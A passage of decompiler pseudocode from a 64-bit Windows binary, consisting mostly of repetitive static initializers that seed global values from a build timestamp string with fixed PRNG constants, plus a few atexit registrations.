// 1400DBD40: using guessed type int dword_1400DBD40;

//----- (0000000140002A60) ----------------------------------------------------
__int64 sub_140002A60()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBD48 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBD48: using guessed type int dword_1400DBD48;

//----- (0000000140002A80) ----------------------------------------------------
__int64 sub_140002A80()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBD3C = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBD3C: using guessed type int dword_1400DBD3C;

//----- (0000000140002AA0) ----------------------------------------------------
__int64 sub_140002AA0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBD68 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBD68: using guessed type int dword_1400DBD68;

//----- (0000000140002AC0) ----------------------------------------------------
__int64 sub_140002AC0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBD64 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBD64: using guessed type int dword_1400DBD64;

//----- (0000000140002AE0) ----------------------------------------------------
__int64 sub_140002AE0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBD6C = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBD6C: using guessed type int dword_1400DBD6C;

//----- (0000000140002B00) ----------------------------------------------------
__int64 sub_140002B00()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBD60 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBD60: using guessed type int dword_1400DBD60;

//----- (0000000140002B20) ----------------------------------------------------
int sub_140002B20()
{
  dword_1400DBD88 &= 0xFFFFFEFF;
  return atexit((void (__cdecl *)())sub_1400A0220);
}
// 1400DBD88: using guessed type int dword_1400DBD88;

//----- (0000000140002B40) ----------------------------------------------------
void *sub_140002B40()
{
  void *result; // rax

  result = off_1400D80C8;
  qword_1400DBD78 = (__int64)off_1400D80C8;
  return result;
}
// 1400D80C8: using guessed type void *off_1400D80C8;
// 1400DBD78: using guessed type __int64 qword_1400DBD78;

//----- (0000000140002B50) ----------------------------------------------------
__int64 sub_140002B50()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBDB4 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBDB4: using guessed type int dword_1400DBDB4;

//----- (0000000140002B70) ----------------------------------------------------
__int64 sub_140002B70()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBDB0 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBDB0: using guessed type int dword_1400DBDB0;

//----- (0000000140002B90) ----------------------------------------------------
__int64 sub_140002B90()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBDB8 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBDB8: using guessed type int dword_1400DBDB8;

//----- (0000000140002BB0) ----------------------------------------------------
__int64 sub_140002BB0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBDAC = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBDAC: using guessed type int dword_1400DBDAC;

//----- (0000000140002BD0) ----------------------------------------------------
__int64 sub_140002BD0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBDD0 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBDD0: using guessed type int dword_1400DBDD0;

//----- (0000000140002BF0) ----------------------------------------------------
__int64 sub_140002BF0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBDCC = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBDCC: using guessed type int dword_1400DBDCC;

//----- (0000000140002C10) ----------------------------------------------------
__int64 sub_140002C10()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBDD4 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBDD4: using guessed type int dword_1400DBDD4;

//----- (0000000140002C30) ----------------------------------------------------
__int64 sub_140002C30()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBDC8 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBDC8: using guessed type int dword_1400DBDC8;

//----- (0000000140002C50) ----------------------------------------------------
__int64 sub_140002C50()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBDF4 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBDF4: using guessed type int dword_1400DBDF4;

//----- (0000000140002C70) ----------------------------------------------------
__int64 sub_140002C70()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBDF0 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBDF0: using guessed type int dword_1400DBDF0;

//----- (0000000140002C90) ----------------------------------------------------
__int64 sub_140002C90()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBDFC = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBDFC: using guessed type int dword_1400DBDFC;

//----- (0000000140002CB0) ----------------------------------------------------
__int64 sub_140002CB0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBDEC = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBDEC: using guessed type int dword_1400DBDEC;

//----- (0000000140002CD0) ----------------------------------------------------
__int64 sub_140002CD0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBE3C = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBE3C: using guessed type int dword_1400DBE3C;

//----- (0000000140002CF0) ----------------------------------------------------
__int64 sub_140002CF0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBE38 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBE38: using guessed type int dword_1400DBE38;

//----- (0000000140002D10) ----------------------------------------------------
__int64 sub_140002D10()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBE40 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBE40: using guessed type int dword_1400DBE40;

//----- (0000000140002D30) ----------------------------------------------------
__int64 sub_140002D30()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBE34 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBE34: using guessed type int dword_1400DBE34;

//----- (0000000140002D50) ----------------------------------------------------
__int64 sub_140002D50()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBE70 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBE70: using guessed type int dword_1400DBE70;

//----- (0000000140002D70) ----------------------------------------------------
__int64 sub_140002D70()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBE6C = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBE6C: using guessed type int dword_1400DBE6C;

//----- (0000000140002D90) ----------------------------------------------------
__int64 sub_140002D90()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBE74 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBE74: using guessed type int dword_1400DBE74;

//----- (0000000140002DB0) ----------------------------------------------------
__int64 sub_140002DB0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBE68 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBE68: using guessed type int dword_1400DBE68;

//----- (0000000140002DD0) ----------------------------------------------------
int sub_140002DD0()
{
  return atexit((void (__cdecl *)())sub_1400A02A0);
}

//----- (0000000140002DE0) ----------------------------------------------------
__int64 sub_140002DE0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBECC = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBECC: using guessed type int dword_1400DBECC;

//----- (0000000140002E00) ----------------------------------------------------
__int64 sub_140002E00()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBEC8 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBEC8: using guessed type int dword_1400DBEC8;

//----- (0000000140002E20) ----------------------------------------------------
__int64 sub_140002E20()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBED0 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBED0: using guessed type int dword_1400DBED0;

//----- (0000000140002E40) ----------------------------------------------------
__int64 sub_140002E40()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBEC4 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBEC4: using guessed type int dword_1400DBEC4;

//----- (0000000140002E60) ----------------------------------------------------
__int64 sub_140002E60()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBF20 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBF20: using guessed type int dword_1400DBF20;

//----- (0000000140002E80) ----------------------------------------------------
__int64 sub_140002E80()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBF1C = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBF1C: using guessed type int dword_1400DBF1C;

//----- (0000000140002EA0) ----------------------------------------------------
__int64 sub_140002EA0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBF24 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBF24: using guessed type int dword_1400DBF24;

//----- (0000000140002EC0) ----------------------------------------------------
__int64 sub_140002EC0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DBF18 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DBF18: using guessed type int dword_1400DBF18;

//----- (0000000140002EE0) ----------------------------------------------------
__int64 sub_140002EE0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBF54 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBF54: using guessed type int dword_1400DBF54;

//----- (0000000140002F00) ----------------------------------------------------
__int64 sub_140002F00()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBF50 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBF50: using guessed type int dword_1400DBF50;

//----- (0000000140002F20) ----------------------------------------------------
__int64 sub_140002F20()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBF58 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBF58: using guessed type int dword_1400DBF58;

//----- (0000000140002F40) ----------------------------------------------------
__int64 sub_140002F40()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DBF4C = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DBF4C: using guessed type int dword_1400DBF4C;

//----- (0000000140002F60) ----------------------------------------------------
__int64 sub_140002F60()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC008 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC008: using guessed type int dword_1400DC008;

//----- (0000000140002F80) ----------------------------------------------------
__int64 sub_140002F80()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC004 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC004: using guessed type int dword_1400DC004;

//----- (0000000140002FA0) ----------------------------------------------------
__int64 sub_140002FA0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC00C = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC00C: using guessed type int dword_1400DC00C;

//----- (0000000140002FC0) ----------------------------------------------------
__int64 sub_140002FC0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC000 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC000: using guessed type int dword_1400DC000;

//----- (0000000140002FE0) ----------------------------------------------------
__int64 sub_140002FE0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC098 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC098: using guessed type int dword_1400DC098;

//----- (0000000140003000) ----------------------------------------------------
__int64 sub_140003000()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC094 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC094: using guessed type int dword_1400DC094;

//----- (0000000140003020) ----------------------------------------------------
__int64 sub_140003020()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC09C = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC09C: using guessed type int dword_1400DC09C;

//----- (0000000140003040) ----------------------------------------------------
__int64 sub_140003040()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC090 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC090: using guessed type int dword_1400DC090;

//----- (0000000140003060) ----------------------------------------------------
__int64 sub_140003060()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC0D4 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC0D4: using guessed type int dword_1400DC0D4;

//----- (0000000140003080) ----------------------------------------------------
__int64 sub_140003080()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC0D0 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC0D0: using guessed type int dword_1400DC0D0;

//----- (00000001400030A0) ----------------------------------------------------
__int64 sub_1400030A0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC0D8 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC0D8: using guessed type int dword_1400DC0D8;

//----- (00000001400030C0) ----------------------------------------------------
__int64 sub_1400030C0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC0CC = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC0CC: using guessed type int dword_1400DC0CC;

//----- (00000001400030E0) ----------------------------------------------------
__int64 sub_1400030E0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC130 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC130: using guessed type int dword_1400DC130;

//----- (0000000140003100) ----------------------------------------------------
__int64 sub_140003100()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC12C = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC12C: using guessed type int dword_1400DC12C;

//----- (0000000140003120) ----------------------------------------------------
__int64 sub_140003120()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC134 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC134: using guessed type int dword_1400DC134;

//----- (0000000140003140) ----------------------------------------------------
__int64 sub_140003140()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC128 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC128: using guessed type int dword_1400DC128;

//----- (0000000140003160) ----------------------------------------------------
__int64 sub_140003160()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC188 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC188: using guessed type int dword_1400DC188;

//----- (0000000140003180) ----------------------------------------------------
__int64 sub_140003180()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC184 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC184: using guessed type int dword_1400DC184;

//----- (00000001400031A0) ----------------------------------------------------
__int64 sub_1400031A0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC18C = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC18C: using guessed type int dword_1400DC18C;

//----- (00000001400031C0) ----------------------------------------------------
__int64 sub_1400031C0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC180 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC180: using guessed type int dword_1400DC180;

//----- (00000001400031E0) ----------------------------------------------------
__int64 sub_1400031E0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC20C = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC20C: using guessed type int dword_1400DC20C;

//----- (0000000140003200) ----------------------------------------------------
__int64 sub_140003200()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC208 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC208: using guessed type int dword_1400DC208;

//----- (0000000140003220) ----------------------------------------------------
__int64 sub_140003220()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC210 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC210: using guessed type int dword_1400DC210;

//----- (0000000140003240) ----------------------------------------------------
__int64 sub_140003240()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC204 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC204: using guessed type int dword_1400DC204;

//----- (0000000140003260) ----------------------------------------------------
__int64 sub_140003260()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC254 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC254: using guessed type int dword_1400DC254;

//----- (0000000140003280) ----------------------------------------------------
__int64 sub_140003280()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC250 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC250: using guessed type int dword_1400DC250;

//----- (00000001400032A0) ----------------------------------------------------
__int64 sub_1400032A0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC258 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC258: using guessed type int dword_1400DC258;

//----- (00000001400032C0) ----------------------------------------------------
__int64 sub_1400032C0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC24C = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC24C: using guessed type int dword_1400DC24C;

//----- (00000001400032E0) ----------------------------------------------------
__int64 sub_1400032E0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC378 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC378: using guessed type int dword_1400DC378;

//----- (0000000140003300) ----------------------------------------------------
__int64 sub_140003300()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC374 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC374: using guessed type int dword_1400DC374;

//----- (0000000140003320) ----------------------------------------------------
__int64 sub_140003320()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC37C = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC37C: using guessed type int dword_1400DC37C;

//----- (0000000140003340) ----------------------------------------------------
__int64 sub_140003340()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DC370 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DC370: using guessed type int dword_1400DC370;

//----- (0000000140003354) ----------------------------------------------------
int sub_140003354()
{
  return atexit((void (__cdecl *)())unknown_libname_116);
}
// 1400A044C: using guessed type __int64 __fastcall unknown_libname_116();

//----- (0000000140003360) ----------------------------------------------------
__int64 sub_140003360()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DCBF0 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DCBF0: using guessed type int dword_1400DCBF0;

//----- (0000000140003380) ----------------------------------------------------
__int64 sub_140003380()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DCBEC = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DCBEC: using guessed type int dword_1400DCBEC;

//----- (00000001400033A0) ----------------------------------------------------
__int64 sub_1400033A0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DCBF4 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DCBF4: using guessed type int dword_1400DCBF4;

//----- (00000001400033C0) ----------------------------------------------------
__int64 sub_1400033C0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DCBE8 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DCBE8: using guessed type int dword_1400DCBE8;

//----- (00000001400033E0) ----------------------------------------------------
__int64 sub_1400033E0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DCC04 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DCC04: using guessed type int dword_1400DCC04;

//----- (0000000140003400) ----------------------------------------------------
__int64 sub_140003400()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DCC00 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DCC00: using guessed type int dword_1400DCC00;

//----- (0000000140003420) ----------------------------------------------------
__int64 sub_140003420()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DCC08 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DCC08: using guessed type int dword_1400DCC08;

//----- (0000000140003440) ----------------------------------------------------
__int64 sub_140003440()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DCBFC = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DCBFC: using guessed type int dword_1400DCBFC;

//----- (0000000140003460) ----------------------------------------------------
__int64 sub_140003460()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD01C = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD01C: using guessed type int dword_1400DD01C;

//----- (0000000140003480) ----------------------------------------------------
__int64 sub_140003480()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD018 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD018: using guessed type int dword_1400DD018;

//----- (00000001400034A0) ----------------------------------------------------
__int64 sub_1400034A0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD020 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD020: using guessed type int dword_1400DD020;

//----- (00000001400034C0) ----------------------------------------------------
__int64 sub_1400034C0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD014 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD014: using guessed type int dword_1400DD014;

//----- (00000001400034E0) ----------------------------------------------------
int sub_1400034E0()
{
  sub_140053F60((__int64)&qword_1400DD040);
  qword_1400DD040 = (__int64)&off_1400A6728;
  sub_140054A10((__int64)&qword_1400DD040, 0i64, 0x20u);
  return atexit(sub_1400A04A0);
}
// 1400A6728: using guessed type __int64 (__fastcall *off_1400A6728)(void *);
// 1400DD040: using guessed type __int64 qword_1400DD040;

//----- (0000000140003530) ----------------------------------------------------
__int64 sub_140003530()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD034 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD034: using guessed type int dword_1400DD034;

//----- (0000000140003550) ----------------------------------------------------
__int64 sub_140003550()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD030 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD030: using guessed type int dword_1400DD030;

//----- (0000000140003570) ----------------------------------------------------
__int64 sub_140003570()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD038 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD038: using guessed type int dword_1400DD038;

//----- (0000000140003590) ----------------------------------------------------
__int64 sub_140003590()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD02C = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD02C: using guessed type int dword_1400DD02C;

//----- (00000001400035B0) ----------------------------------------------------
__int64 sub_1400035B0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD560 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD560: using guessed type int dword_1400DD560;

//----- (00000001400035D0) ----------------------------------------------------
